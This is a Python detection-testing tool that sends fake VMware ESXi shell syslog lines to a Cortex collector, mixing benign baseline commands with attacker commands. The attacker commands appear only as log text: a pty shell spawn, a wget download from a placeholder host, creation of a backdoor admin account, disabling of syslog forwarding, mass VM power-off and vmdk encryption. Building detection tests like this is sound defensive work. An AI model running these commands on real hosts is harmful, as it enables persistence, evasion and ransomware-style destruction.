#!/usr/bin/env python3
"""
esxi_syslog_emitter — fake VMware ESXi (virtualization host) data source that
streams shape-true shell-command records to Cortex XSIAM/XDR over **syslog**.

Why this exists
---------------
The Cortex Analytics data source *"VMware virtualization servers syslogs"* backs
the analytics alerts **"Uncommon command executed on a virtualization host"** and
**"Uncommon command was executed on a device"** (ATT&CK Execution / T1059 /
T1059.012 Hypervisor CLI). Those alerts read the ESXi shell/hostd command feed
that ESXi forwards by **syslog** to a Cortex Broker VM syslog applet (UDP/TCP 514).

This module lets a DC validate those analytics detections *without a real ESXi
host or real tenant*: it generates authentic-shape ESXi ``shell[...]`` syslog
lines (a mix of a benign baseline the detector *learns* and the uncommon attacker
commands it should flag) and sends them to an operator-supplied syslog collector.
It mirrors the ``analytics_emitter`` log-streamer family (shape-true records to a
collector the customer already trusts) but speaks **syslog**, not HTTP POST.

Safety (CortexSim doctrine)
---------------------------
* No real ESXi is touched and no command is executed — every record is a syslog
  STRING shaped like ESXi's shell log. The attacker commands appear only as log
  TEXT the detector parses.
* Default collector host is TEST-NET-1 (192.0.2.0/24) and ``--dry-run`` prints
  the records without opening a socket. Point ``--collector`` at your lab Broker
  VM to actually stream.
* stdlib only (``socket``) so it runs on a clean jumpbox with no pip install.

ESXi shell log shape (what Cortex parses from the VMware syslog)
----------------------------------------------------------------
    <134>1 2026-11-11T20:00:00Z esxi01.lab.local Shell - - - \
        [user='root'] [pid=100123] running command: esxcli system account add -i svc-evil

Cortex normalises these ESXi syslog records into the data source's dataset with,
at minimum: the host (``esxi01.lab.local``), the acting user (``root``), and the
executed command string — which the behavioural model profiles per host to decide
whether a command is "uncommon".

Usage
-----
    # preview the full campaign (baseline + attacker), write nothing on the wire
    python3 esxi_syslog_emitter.py --dry-run

    # stream to a lab Broker VM syslog applet over UDP/514
    python3 esxi_syslog_emitter.py --collector 10.1.1.9 --port 514 --proto udp

    # only the uncommon attacker commands (skip the learned baseline)
    python3 esxi_syslog_emitter.py --collector 10.1.1.9 --phase attack
"""
from __future__ import annotations

import argparse
import random
import socket
import sys
import time
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Command corpora. The detector learns the baseline per host over its training
# window; the attacker commands are the ones "rarely seen on virtualization
# hosts" that should raise "Uncommon command executed on a virtualization host".
# ---------------------------------------------------------------------------

# Benign ESXi operations an admin/host runs constantly (the learned baseline).
BASELINE_COMMANDS = [
    "esxcli system version get",
    "esxcli network ip interface list",
    "esxcli storage core device list",
    "vim-cmd vmsvc/getallvms",
    "esxcli hardware platform get",
    "esxcli system maintenanceMode get",
    "esxcli vm process list",
    "esxcli network nic list",
    "esxcli system hostname get",
    "df -h",
]

# Uncommon / attacker commands on the hypervisor management plane. Each maps to
# the detector's described behaviours: interactive shells, account-manipulation,
# audit-tampering, and ESXi ransomware-style mass VM impact.
ATTACK_COMMANDS = [
    # interactive shell / tooling fetch (T1059.012 / T1059.004)
    ("python -c 'import pty;pty.spawn(\"/bin/sh\")'", "interactive-shell"),
    ("wget http://192.0.2.1/x.sh -O /tmp/x.sh", "ingress-tool-transfer"),
    # account manipulation (T1136 / T1098)
    ("esxcli system account add -i svc-evil -p 'Pa55w0rd!' -d backdoor", "account-manipulation"),
    ("esxcli system permission set -i svc-evil -r Admin", "account-manipulation"),
    # defense evasion / audit tampering (T1562.001)
    ("esxcli system syslog config set --loghost=''", "audit-tampering"),
    ("esxcli system syslog reload", "audit-tampering"),
    ("esxcli system coredump file set --unconfigure", "audit-tampering"),
    # ESXi ransomware / inhibit-recovery style mass impact (T1486 / T1490)
    ("vim-cmd vmsvc/power.off $(vim-cmd vmsvc/getallvms | awk 'NR>1{print $1}')", "mass-vm-poweroff"),
    ("find /vmfs/volumes -name '*.vmdk' -exec esxcli ...encrypt {} \\;", "mass-vmdk-encrypt"),
]


def _rfc5424(host: str, user: str, pid: int, command: str, prio: int = 134) -> str:
    """One ESXi shell-log record as an RFC 5424 syslog line (what ESXi forwards)."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    sd = f"[user='{user}'] [pid={pid}]"
    return f"<{prio}>1 {ts} {host} Shell - - - {sd} running command: {command}"


def build_records(host: str, user: str, phase: str, baseline_n: int):
    """Yield (record, tag) syslog lines for the requested phase."""
    if phase in ("baseline", "both"):
        for _ in range(baseline_n):
            cmd = random.choice(BASELINE_COMMANDS)
            yield _rfc5424(host, user, random.randint(100000, 199999), cmd), "baseline"
    if phase in ("attack", "both"):
        for cmd, tag in ATTACK_COMMANDS:
            yield _rfc5424(host, user, random.randint(200000, 299999), cmd), tag


def send(records, collector: str, port: int, proto: str, pace: float, dry_run: bool) -> int:
    sent = 0
    sock = None
    if not dry_run:
        fam = socket.SOCK_DGRAM if proto == "udp" else socket.SOCK_STREAM
        sock = socket.socket(socket.AF_INET, fam)
        if proto == "tcp":
            sock.connect((collector, port))
    try:
        for rec, tag in records:
            if dry_run:
                print(f"[{tag:22}] {rec}")
            else:
                data = (rec + "\n").encode("utf-8", "replace")
                if proto == "udp":
                    sock.sendto(data, (collector, port))
                else:
                    sock.sendall(data)
            sent += 1
            if pace and not dry_run:
                time.sleep(pace)
    finally:
        if sock:
            sock.close()
    return sent


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Fake VMware ESXi syslog data source for Cortex Analytics validation.")
    p.add_argument("--collector", default="192.0.2.9", help="syslog collector / Broker VM IP (default TEST-NET-1)")
    p.add_argument("--port", type=int, default=514)
    p.add_argument("--proto", choices=["udp", "tcp"], default="udp")
    p.add_argument("--host", default="esxi01.lab.local", help="source ESXi hostname in the records")
    p.add_argument("--user", default="root", help="acting user in the records")
    p.add_argument("--phase", choices=["baseline", "attack", "both"], default="both",
                   help="baseline = learned-normal only; attack = uncommon commands only; both = full campaign")
    p.add_argument("--baseline-count", type=int, default=40, help="number of baseline records (training signal)")
    p.add_argument("--pace", type=float, default=0.0, help="seconds between records")
    p.add_argument("--dry-run", action="store_true", help="print records; open no socket")
    a = p.parse_args(argv)

    records = list(build_records(a.host, a.user, a.phase, a.baseline_count))
    n = send(records, a.collector, a.port, a.proto, a.pace, a.dry_run)
    where = "(dry-run, nothing sent)" if a.dry_run else f"-> {a.proto}://{a.collector}:{a.port}"
    attack = sum(1 for _, t in records if t != "baseline")
    print(f"\nESXi syslog: {n} records {where}  ({n-attack} baseline, {attack} uncommon/attacker)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
